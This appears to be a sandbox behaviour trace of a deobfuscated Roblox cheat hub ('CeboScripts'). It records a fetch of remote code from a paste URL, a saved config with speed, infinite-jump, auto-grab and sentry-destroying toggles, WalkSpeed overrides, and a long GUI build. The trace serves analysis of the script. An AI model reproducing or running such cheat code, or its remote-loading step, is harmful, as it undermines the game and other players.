-- deobfed at discord.gg/mwp
-- source: input.lua
-- behaviour trace: what the script did when run in a fake Roblox environment
-- (only the code paths that actually ran)
-- run status: finished
-- 2976 statements recorded in 0.80s
-- URLs requested:
--   https://pastefy.app/bfFQjy7S/raw
-- non-standard globals touched: St, AntiRagdollV2, AntiFX, getconstants, turretAddedConn, _holdInfJumpConn, fovConn, mbGroup, spamConn, dropActiveTimer

task.wait()
game:IsLoaded()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Debris = game:GetService("Debris")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PathfindingService = game:GetService("PathfindingService")
local Lighting = game:GetService("Lighting")
Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-- isfile("CeboScripts_Config.json") -> false
St.antiRagdoll = false
St.antiRagdollMode = St.antiRagdollMode
St.antiGummy = false
St.antiPaint = false
St.antiBoogie = false
St.spamLaser = false
St.spamPaint = false

_G.RYXHUBSetAntiRagdollMode = function(arg)
	tostring(arg):upper()
	St.antiRagdollMode = "V1"

	task.defer(function()
		local json = HttpService:JSONEncode({
	antiBoogieEnabled = false,
	antiGummyEnabled = false,
	antiLagEnabled = false,
	antiPaintEnabled = false,
	antiRagdollEnabled = false,
	autoGrabEnabled = false,
	autoPotionView = "button",
	autoWalkEnabled = false,
	carrySpeedEnabled = false,
	carrySpeedValue = 30,
	destroySentry = false,
	dropView = "button",
	fovEnabled = false,
	fovValue = 80,
	headlessEnabled = false,
	highlightEnabled = false,
	infJumpEnabled = false,
	infJumpMode = "hold",
	instaRestView = "button",
	mobBtnPos = {},
	mobileButtonsEnabled = true,
	mobileButtonsLocked = false,
	normalSpeedEnabled = true,
	normalSpeedValue = 60,
	spamLaserView = "button",
	spamPaitballView = "button",
	speedEnabled = true,
	speedValue = 190,
	transportIndex = 1
})

		writefile("CeboScripts_Config.json", json)
	end)
end

_G._FAG_RyxAntiGummyFullLoaded = true

task.spawn(function(...)
	task.spawn(function()
		task.wait(5)
		task.wait(5)
		-- [envlog] the statements above repeat forever (loop)
	end)

	task.spawn(function()
		task.wait(0.5)
		task.wait(0.5)
		-- [envlog] the statements above repeat forever (loop)
	end)

	Lighting.ChildAdded:Connect(function(child)
	end)

	local PlayerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
	local Main = PlayerGui:FindFirstChild("Main")
	Main:GetAttribute("_RyxAntiPaintballHooked")

	PlayerGui.ChildAdded:Connect(function(child2)
	end)

	Players.LocalPlayer.CharacterAdded:Connect(function(character)
		task.defer(function()
		end)
	end)
end)

local Backpack = Players.LocalPlayer:FindFirstChild("Backpack")
local children = Backpack:GetChildren()

for i, v in ipairs(children) do
	v.Name:gsub("%s+", "")
end

Backpack.ChildAdded:Connect(function(child3)
	task.wait(0.05)
	child3.Name:gsub("%s+", "")
end)

local children2 = Players.LocalPlayer.Character:GetChildren()

for i2, v2 in ipairs(children2) do
	v2.Name:gsub("%s+", "")
end

Players.LocalPlayer.Character.ChildAdded:Connect(function(child4)
	task.wait(0.05)
	child4.Name:gsub("%s+", "")
end)

Players.LocalPlayer.CharacterAdded:Connect(function(character2)
	task.wait(0.2)
	local children5 = character2:GetChildren()

	for i7, v7 in ipairs(children5) do
		v7.Name:gsub("%s+", "")
	end

	character2.ChildAdded:Connect(function(child9)
		task.wait(0.05)
		child9.Name:gsub("%s+", "")
	end)

	local Backpack2 = Players.LocalPlayer:FindFirstChild("Backpack")
	local children6 = Backpack2:GetChildren()

	for i8, v8 in ipairs(children6) do
		v8.Name:gsub("%s+", "")
	end

	Backpack2.ChildAdded:Connect(function(child10)
		task.wait(0.05)
		child10.Name:gsub("%s+", "")
	end)
end)

Players.LocalPlayer.Character.ChildRemoved:Connect(function(child5)
end)

Players.LocalPlayer.CharacterAdded:Connect(function(character3)
	task.wait(0.1)

	character3.ChildRemoved:Connect(function(child11)
	end)
end)

RunService.RenderStepped:Connect(function(deltaTime)
	Players.LocalPlayer.Character:FindFirstChild("Carrying", true)
	local tween = TweenService:Create(Frame22, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween:Play()
	local tween2 = TweenService:Create(Frame23, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween2:Play()
	local tween3 = TweenService:Create(Frame25, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween3:Play()
	local tween4 = TweenService:Create(Frame26, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween4:Play()
	local Humanoid = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	Humanoid:GetState()
	Humanoid.WalkSpeed = 30
	-- [envlog] error: Script:2: attempt to index function with 'Magnitude'
end)

_G._CeboJumpHook = true

task.spawn(function()
	local PlayerGui2 = Players.LocalPlayer:WaitForChild("PlayerGui", 15)
	local descendants = PlayerGui2:GetDescendants()

	for i3, v3 in ipairs(descendants) do
	end

	PlayerGui2.DescendantAdded:Connect(function(descendant)
	end)
end)

UserInputService.JumpRequest:Connect(function()
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
end)

task.spawn(function()
	task.wait(5)
	task.wait(5)
	-- [envlog] the statements above repeat forever (loop)
end)

local PlayerGui3 = Players.LocalPlayer:WaitForChild("PlayerGui")
local children3 = PlayerGui3:GetChildren()

for i4, v4 in ipairs(children3) do
end

local FilthyHubInstaReset = Instance.new("ScreenGui")
FilthyHubInstaReset.Name = "FilthyHubInstaReset"
FilthyHubInstaReset.ResetOnSpawn = false
FilthyHubInstaReset.DisplayOrder = 999999
FilthyHubInstaReset.IgnoreGuiInset = true
local PlayerGui4 = Players.LocalPlayer:WaitForChild("PlayerGui")
FilthyHubInstaReset.Parent = PlayerGui4
local CenterDiscordText = Instance.new("TextLabel", FilthyHubInstaReset)
CenterDiscordText.Name = "CenterDiscordText"
CenterDiscordText.AnchorPoint = Vector2.new(0.5, 0.5)
CenterDiscordText.Position = UDim2.new(0.5, 0, 0.7, 0)
CenterDiscordText.Size = UDim2.new(0, 320, 0, 26)
CenterDiscordText.BackgroundTransparency = 1
CenterDiscordText.Text = "https://discord.gg/cvph33YZn"
CenterDiscordText.Font = Enum.Font.GothamBlack
CenterDiscordText.TextColor3 = Color3.fromRGB(255, 255, 255)
CenterDiscordText.TextSize = 16
CenterDiscordText.ZIndex = 1
CenterDiscordText:GetChildren()
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(231, 76, 76)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(160, 35, 35)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(75, 12, 12)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 4, 4)) })
UIGradient.Rotation = 90
UIGradient.Parent = CenterDiscordText
local CeboCartelPos1 = workspace:FindFirstChild("CeboCartelPos1")
CeboCartelPos1:Destroy()
local CeboCartelPos12 = Instance.new("Part")
CeboCartelPos12.Name = "CeboCartelPos1"
CeboCartelPos12.Size = Vector3.new(1, 1, 1)
CeboCartelPos12.Position = Vector3.new(-466.76998901367188, -6.7800002098083496, 114.61000061035156)
CeboCartelPos12.Anchored = true
CeboCartelPos12.CanCollide = false
CeboCartelPos12.Transparency = 1
CeboCartelPos12.Parent = workspace
local CartelGui = Instance.new("BillboardGui")
CartelGui.Name = "CartelGui"
CartelGui.Size = UDim2.new(0, 140, 0, 28)
CartelGui.StudsOffset = Vector3.new(0, 2.2000000476837158, 0)
CartelGui.AlwaysOnTop = true
CartelGui.Parent = CeboCartelPos12
local TextLabel2 = Instance.new("TextLabel", CartelGui)
TextLabel2.Size = UDim2.new(1, 0, 1, 0)
TextLabel2.BackgroundTransparency = 1
TextLabel2.Text = "POS 1"
TextLabel2.Font = Enum.Font.GothamBlack
TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.TextSize = 18
TextLabel2.TextStrokeTransparency = 0.15
TextLabel2.TextStrokeColor3 = Color3.fromRGB(15, 2, 2)
TextLabel2:GetChildren()
local UIGradient2 = Instance.new("UIGradient")
UIGradient2.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(231, 76, 76)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(160, 35, 35)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(75, 12, 12)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 4, 4)) })
UIGradient2.Rotation = 90
UIGradient2.Parent = TextLabel2
local CeboCartelPos2 = workspace:FindFirstChild("CeboCartelPos2")
CeboCartelPos2:Destroy()
local CeboCartelPos22 = Instance.new("Part")
CeboCartelPos22.Name = "CeboCartelPos2"
CeboCartelPos22.Size = Vector3.new(1, 1, 1)
CeboCartelPos22.Position = Vector3.new(-465.47000122070312, -6.9600000381469727, 6.6399998664855957)
CeboCartelPos22.Anchored = true
CeboCartelPos22.CanCollide = false
CeboCartelPos22.Transparency = 1
CeboCartelPos22.Parent = workspace
local CartelGui2 = Instance.new("BillboardGui")
CartelGui2.Name = "CartelGui"
CartelGui2.Size = UDim2.new(0, 140, 0, 28)
CartelGui2.StudsOffset = Vector3.new(0, 2.2000000476837158, 0)
CartelGui2.AlwaysOnTop = true
CartelGui2.Parent = CeboCartelPos22
local TextLabel3 = Instance.new("TextLabel", CartelGui2)
TextLabel3.Size = UDim2.new(1, 0, 1, 0)
TextLabel3.BackgroundTransparency = 1
TextLabel3.Text = "POS 2"
TextLabel3.Font = Enum.Font.GothamBlack
TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel3.TextSize = 18
TextLabel3.TextStrokeTransparency = 0.15
TextLabel3.TextStrokeColor3 = Color3.fromRGB(15, 2, 2)
TextLabel3:GetChildren()
local UIGradient3 = Instance.new("UIGradient")
UIGradient3.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(231, 76, 76)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(160, 35, 35)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(75, 12, 12)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 4, 4)) })
UIGradient3.Rotation = 90
UIGradient3.Parent = TextLabel3
local SquircleBorderWrap = Instance.new("Frame", FilthyHubInstaReset)
SquircleBorderWrap.Name = "SquircleBorderWrap"
SquircleBorderWrap.Size = UDim2.new(0, 220, 0, 115)
SquircleBorderWrap.Position = UDim2.new(0.5, -110, 0.5, -57.5)
SquircleBorderWrap.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SquircleBorderWrap.BorderSizePixel = 0
SquircleBorderWrap.Active = true
SquircleBorderWrap.Draggable = true
SquircleBorderWrap.ZIndex = 10
local UICorner = Instance.new("UICorner", SquircleBorderWrap)
UICorner.CornerRadius = UDim.new(0, 16)
SquircleBorderWrap:GetChildren()
local UIGradient4 = Instance.new("UIGradient")
UIGradient4.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 55, 55)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(120, 35, 35)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(50, 15, 15)), ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 6, 6)) })
UIGradient4.Rotation = 150
UIGradient4.Parent = SquircleBorderWrap
local UIStroke = Instance.new("UIStroke", SquircleBorderWrap)
UIStroke.Color = Color3.fromRGB(160, 50, 50)
UIStroke.Thickness = 1.5
local SquircleMainFrame = Instance.new("Frame", SquircleBorderWrap)
SquircleMainFrame.Name = "SquircleMainFrame"
SquircleMainFrame.Size = UDim2.new(1, -2, 1, -2)
SquircleMainFrame.Position = UDim2.new(0, 1, 0, 1)
SquircleMainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SquircleMainFrame.BorderSizePixel = 0
SquircleMainFrame.ClipsDescendants = true
SquircleMainFrame.Active = true
SquircleMainFrame.ZIndex = 11
local UICorner2 = Instance.new("UICorner", SquircleMainFrame)
UICorner2.CornerRadius = UDim.new(0, 15)
SquircleMainFrame:GetChildren()
local UIGradient5 = Instance.new("UIGradient")
UIGradient5.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(26, 5, 5)), ColorSequenceKeypoint.new(0.33333333333333331, Color3.fromRGB(18, 4, 4)), ColorSequenceKeypoint.new(0.66666666666666663, Color3.fromRGB(10, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 1, 1)) })
UIGradient5.Rotation = 150
UIGradient5.Parent = SquircleMainFrame
local Frame3 = Instance.new("Frame", SquircleMainFrame)
Frame3.Size = UDim2.new(1, 0, 0, 36)
Frame3.BackgroundTransparency = 1
Frame3.Active = true
Frame3.ZIndex = 13

Frame3.InputBegan:Connect(function(input2, gameProcessed2)
end)

UserInputService.InputChanged:Connect(function(input3, gameProcessed3)
end)

UserInputService.InputEnded:Connect(function(input4, gameProcessed4)
end)

local TextLabel4 = Instance.new("TextLabel", Frame3)
TextLabel4.Size = UDim2.new(1, -108, 0, 14)
TextLabel4.Position = UDim2.new(0, 12, 0, 6)
TextLabel4.BackgroundTransparency = 1
TextLabel4.Text = "CeboScripts"
TextLabel4.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel4.Font = Enum.Font.GothamBlack
TextLabel4.TextSize = 12
TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
TextLabel4.ZIndex = 14
local TextLabel5 = Instance.new("TextLabel", Frame3)
TextLabel5.Size = UDim2.new(1, -108, 0, 11)
TextLabel5.Position = UDim2.new(0, 12, 0, 20)
TextLabel5.BackgroundTransparency = 1
TextLabel5.Text = "Only All Gears"
TextLabel5.TextColor3 = Color3.fromRGB(138, 90, 90)
TextLabel5.Font = Enum.Font.GothamBold
TextLabel5.TextSize = 8
TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
TextLabel5.ZIndex = 14
local TextButton = Instance.new("TextButton", Frame3)
TextButton.Size = UDim2.new(0, 24, 0, 20)
TextButton.Position = UDim2.new(1, -62, 0.5, -10)
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Text = "в€’"
TextButton.TextColor3 = Color3.fromRGB(240, 222, 222)
TextButton.Font = Enum.Font.GothamBlack
TextButton.TextSize = 14
TextButton.ZIndex = 14
local UICorner3 = Instance.new("UICorner", TextButton)
UICorner3.CornerRadius = UDim.new(0, 6)
TextButton:GetChildren()
local UIGradient6 = Instance.new("UIGradient")
UIGradient6.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(179, 59, 59)), ColorSequenceKeypoint.new(1, Color3.fromRGB(106, 26, 26)) })
UIGradient6.Rotation = 135
UIGradient6.Parent = TextButton
local UIStroke2 = Instance.new("UIStroke", TextButton)
UIStroke2.Color = Color3.fromRGB(160, 60, 60)
local TextButton2 = Instance.new("TextButton", Frame3)
TextButton2.Size = UDim2.new(0, 24, 0, 20)
TextButton2.Position = UDim2.new(1, -90, 0.5, -10)
TextButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.Text = "!"
TextButton2.TextColor3 = Color3.fromRGB(240, 222, 222)
TextButton2.Font = Enum.Font.GothamBlack
TextButton2.TextSize = 14
TextButton2.ZIndex = 14
local UICorner4 = Instance.new("UICorner", TextButton2)
UICorner4.CornerRadius = UDim.new(0, 6)
TextButton2:GetChildren()
local UIGradient7 = Instance.new("UIGradient")
UIGradient7.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(179, 59, 59)), ColorSequenceKeypoint.new(1, Color3.fromRGB(106, 26, 26)) })
UIGradient7.Rotation = 135
UIGradient7.Parent = TextButton2
local UIStroke3 = Instance.new("UIStroke", TextButton2)
UIStroke3.Color = Color3.fromRGB(160, 60, 60)
local TextButton3 = Instance.new("TextButton", Frame3)
TextButton3.Size = UDim2.new(0, 24, 0, 20)
TextButton3.Position = UDim2.new(1, -34, 0.5, -10)
TextButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.Text = "x"
TextButton3.TextColor3 = Color3.fromRGB(240, 222, 222)
TextButton3.Font = Enum.Font.GothamBlack
TextButton3.TextSize = 14
TextButton3.ZIndex = 14
local UICorner5 = Instance.new("UICorner", TextButton3)
UICorner5.CornerRadius = UDim.new(0, 6)
TextButton3:GetChildren()
local UIGradient8 = Instance.new("UIGradient")
UIGradient8.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(179, 59, 59)), ColorSequenceKeypoint.new(1, Color3.fromRGB(106, 26, 26)) })
UIGradient8.Rotation = 135
UIGradient8.Parent = TextButton3
local UIStroke4 = Instance.new("UIStroke", TextButton3)
UIStroke4.Color = Color3.fromRGB(160, 60, 60)
local Frame4 = Instance.new("Frame", SquircleMainFrame)
Frame4.Size = UDim2.new(1, -20, 1, -44)
Frame4.Position = UDim2.new(0, 10, 0, 38)
Frame4.BackgroundTransparency = 1
Frame4.ZIndex = 13
local Frame5 = Instance.new("Frame", Frame4)
Frame5.Size = UDim2.new(1, 0, 0, 62)
Frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame5.BorderSizePixel = 0
Frame5.ZIndex = 14
local UICorner6 = Instance.new("UICorner", Frame5)
UICorner6.CornerRadius = UDim.new(0, 11)
Frame5:GetChildren()
local UIGradient9 = Instance.new("UIGradient")
UIGradient9.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient9.Rotation = 110
UIGradient9.Parent = Frame5
local UIStroke5 = Instance.new("UIStroke", Frame5)
UIStroke5.Color = Color3.fromRGB(100, 35, 35)
local Frame6 = Instance.new("Frame", Frame5)
Frame6.Size = UDim2.new(1, -16, 0, 24)
Frame6.Position = UDim2.new(0, 8, 0, 5)
Frame6.BackgroundTransparency = 1
Frame6.ZIndex = 15
local TextLabel6 = Instance.new("TextLabel", Frame6)
TextLabel6.Size = UDim2.new(0.55, 0, 1, 0)
TextLabel6.BackgroundTransparency = 1
TextLabel6.Text = "RESET PLAYER"
TextLabel6.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel6.Font = Enum.Font.GothamBlack
TextLabel6.TextSize = 11
TextLabel6.TextXAlignment = Enum.TextXAlignment.Left
TextLabel6.ZIndex = 15
local TextButton4 = Instance.new("TextButton", Frame6)
TextButton4.Size = UDim2.new(0, 58, 0, 18)
TextButton4.Position = UDim2.new(1, -58, 0.5, -9)
TextButton4.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton4.Text = "[ NONE ]"
TextButton4.TextColor3 = Color3.fromRGB(179, 59, 59)
TextButton4.Font = Enum.Font.GothamBlack
TextButton4.TextSize = 9
TextButton4.ZIndex = 15
local UICorner7 = Instance.new("UICorner", TextButton4)
UICorner7.CornerRadius = UDim.new(0, 5)
local UIStroke6 = Instance.new("UIStroke", TextButton4)
UIStroke6.Color = Color3.fromRGB(100, 35, 35)
local Frame7 = Instance.new("Frame", Frame5)
Frame7.Size = UDim2.new(1, -16, 0, 24)
Frame7.Position = UDim2.new(0, 8, 0, 32)
Frame7.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame7.ZIndex = 15
local UICorner8 = Instance.new("UICorner", Frame7)
UICorner8.CornerRadius = UDim.new(0, 6)
local TextButton5 = Instance.new("TextButton", Frame7)
TextButton5.Size = UDim2.new(1, 0, 1, 0)
TextButton5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton5.Text = "GO! RESET"
TextButton5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton5.Font = Enum.Font.GothamBlack
TextButton5.TextSize = 10
TextButton5.ZIndex = 16
local UICorner9 = Instance.new("UICorner", TextButton5)
UICorner9.CornerRadius = UDim.new(0, 6)
TextButton5:GetChildren()
local UIGradient10 = Instance.new("UIGradient")
UIGradient10.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(235, 70, 80)) })
UIGradient10.Rotation = 135
UIGradient10.Parent = TextButton5
local Frame8 = Instance.new("Frame", Frame4)
Frame8.Size = UDim2.new(1, 0, 1, 0)
Frame8.BackgroundTransparency = 1
Frame8.Visible = false
Frame8.ZIndex = 14
local ScrollingFrame = Instance.new("ScrollingFrame", Frame8)
ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 2
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(120, 40, 40)
ScrollingFrame.ScrollBarImageTransparency = 0.35
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ZIndex = 15
ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
ScrollingFrame.VerticalScrollBarInset = Enum.ScrollBarInset.None
ScrollingFrame.HorizontalScrollBarInset = Enum.ScrollBarInset.None
local UIPadding = Instance.new("UIPadding", ScrollingFrame)
UIPadding.PaddingTop = UDim.new(0, 2)
UIPadding.PaddingBottom = UDim.new(0, 2)
local Frame9 = Instance.new("Frame", ScrollingFrame)
Frame9.Size = UDim2.new(1, -10, 0, 56)
Frame9.Position = UDim2.new(0, 3, 0, 0)
Frame9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame9.BorderSizePixel = 0
Frame9.ZIndex = 16
local UICorner10 = Instance.new("UICorner", Frame9)
UICorner10.CornerRadius = UDim.new(0, 10)
Frame9:GetChildren()
local UIGradient11 = Instance.new("UIGradient")
UIGradient11.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient11.Rotation = 110
UIGradient11.Parent = Frame9
local UIStroke7 = Instance.new("UIStroke", Frame9)
UIStroke7.Color = Color3.fromRGB(100, 35, 35)
UIStroke7.Thickness = 1.2
local TextLabel7 = Instance.new("TextLabel", Frame9)
TextLabel7.Size = UDim2.new(0, 90, 0, 20)
TextLabel7.Position = UDim2.new(0, 8, 0, 4)
TextLabel7.BackgroundTransparency = 1
TextLabel7.Text = "Auto Walk"
TextLabel7.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel7.Font = Enum.Font.GothamBold
TextLabel7.TextSize = 12
TextLabel7.TextXAlignment = Enum.TextXAlignment.Left
TextLabel7.ZIndex = 17
local Frame10 = Instance.new("Frame", Frame9)
Frame10.Size = UDim2.new(0, 36, 0, 18)
Frame10.Position = UDim2.new(1, -46, 0, 5)
Frame10.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame10.BorderSizePixel = 0
Frame10.ZIndex = 17
local UICorner11 = Instance.new("UICorner", Frame10)
UICorner11.CornerRadius = UDim.new(1, 0)
local UIStroke8 = Instance.new("UIStroke", Frame10)
UIStroke8.Color = Color3.fromRGB(100, 35, 35)
local Frame11 = Instance.new("Frame", Frame10)
Frame11.Size = UDim2.new(0, 14, 0, 14)
Frame11.Position = UDim2.new(0, 2, 0.5, -7)
Frame11.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame11.BorderSizePixel = 0
Frame11.ZIndex = 18
local UICorner12 = Instance.new("UICorner", Frame11)
UICorner12.CornerRadius = UDim.new(1, 0)
local TextButton6 = Instance.new("TextButton", Frame10)
TextButton6.Size = UDim2.new(1, 0, 1, 0)
TextButton6.BackgroundTransparency = 1
TextButton6.Text = ""
TextButton6.ZIndex = 19
local TextButton7 = Instance.new("TextButton", Frame9)
TextButton7.Size = UDim2.new(0.46, 0, 0, 22)
TextButton7.Position = UDim2.new(0, 8, 0, 28)
TextButton7.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton7.Text = "[ POS 1 ]"
TextButton7.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton7.Font = Enum.Font.GothamBlack
TextButton7.TextSize = 11
TextButton7.ZIndex = 17
local UICorner13 = Instance.new("UICorner", TextButton7)
UICorner13.CornerRadius = UDim.new(0, 6)
local UIStroke9 = Instance.new("UIStroke", TextButton7)
UIStroke9.Color = Color3.fromRGB(100, 35, 35)
local TextButton8 = Instance.new("TextButton", Frame9)
TextButton8.Size = UDim2.new(0.46, 0, 0, 22)
TextButton8.Position = UDim2.new(0.52, 0, 0, 28)
TextButton8.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton8.Text = "[ POS 2 ]"
TextButton8.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton8.Font = Enum.Font.GothamBlack
TextButton8.TextSize = 11
TextButton8.ZIndex = 17
local UICorner14 = Instance.new("UICorner", TextButton8)
UICorner14.CornerRadius = UDim.new(0, 6)
local UIStroke10 = Instance.new("UIStroke", TextButton8)
UIStroke10.Color = Color3.fromRGB(100, 35, 35)

TextButton6.MouseButton1Click:Connect(function()
	local tween5 = TweenService:Create(Frame10, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween5:Play()
	local tween6 = TweenService:Create(Frame11, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween6:Play()

	task.defer(function()
	end)
end)

TextButton7.MouseButton1Click:Connect(function()
	TextButton7.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton7.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton8.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton8.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

TextButton8.MouseButton1Click:Connect(function()
	TextButton8.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
	TextButton8.TextColor3 = Color3.fromRGB(235, 220, 220)
	TextButton7.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	TextButton7.TextColor3 = Color3.fromRGB(212, 184, 184)
end)

local Frame12 = Instance.new("Frame", ScrollingFrame)
Frame12.Size = UDim2.new(1, -10, 0, 36)
Frame12.Position = UDim2.new(0, 3, 0, 62)
Frame12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame12.BorderSizePixel = 0
Frame12.ZIndex = 16
local UICorner15 = Instance.new("UICorner", Frame12)
UICorner15.CornerRadius = UDim.new(0, 10)
Frame12:GetChildren()
local UIGradient12 = Instance.new("UIGradient")
UIGradient12.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient12.Rotation = 110
UIGradient12.Parent = Frame12
local UIStroke11 = Instance.new("UIStroke", Frame12)
UIStroke11.Color = Color3.fromRGB(100, 35, 35)
UIStroke11.Thickness = 1.2
local TextLabel8 = Instance.new("TextLabel", Frame12)
TextLabel8.Size = UDim2.new(0, 48, 1, 0)
TextLabel8.Position = UDim2.new(0, 8, 0, 0)
TextLabel8.BackgroundTransparency = 1
TextLabel8.Text = "Speed"
TextLabel8.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel8.Font = Enum.Font.GothamBold
TextLabel8.TextSize = 12
TextLabel8.TextXAlignment = Enum.TextXAlignment.Left
TextLabel8.ZIndex = 17
local TextBox = Instance.new("TextBox", Frame12)
TextBox.Size = UDim2.new(0, 52, 0, 20)
TextBox.Position = UDim2.new(0, 56, 0.5, -10)
TextBox.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextBox.Text = "190"
TextBox.TextColor3 = Color3.fromRGB(212, 184, 184)
TextBox.Font = Enum.Font.GothamBold
TextBox.TextSize = 11
TextBox.BorderSizePixel = 0
TextBox.ClearTextOnFocus = false
TextBox.ZIndex = 17
local UICorner16 = Instance.new("UICorner", TextBox)
UICorner16.CornerRadius = UDim.new(0, 4)
local UIStroke12 = Instance.new("UIStroke", TextBox)
UIStroke12.Color = Color3.fromRGB(100, 35, 35)
local Frame13 = Instance.new("Frame", Frame12)
Frame13.Size = UDim2.new(0, 36, 0, 18)
Frame13.Position = UDim2.new(1, -46, 0.5, -9)
Frame13.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame13.BorderSizePixel = 0
Frame13.ZIndex = 17
local UICorner17 = Instance.new("UICorner", Frame13)
UICorner17.CornerRadius = UDim.new(1, 0)
local UIStroke13 = Instance.new("UIStroke", Frame13)
UIStroke13.Color = Color3.fromRGB(100, 35, 35)
local Frame14 = Instance.new("Frame", Frame13)
Frame14.Size = UDim2.new(0, 14, 0, 14)
Frame14.Position = UDim2.new(0, 2, 0.5, -7)
Frame14.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame14.BorderSizePixel = 0
Frame14.ZIndex = 18
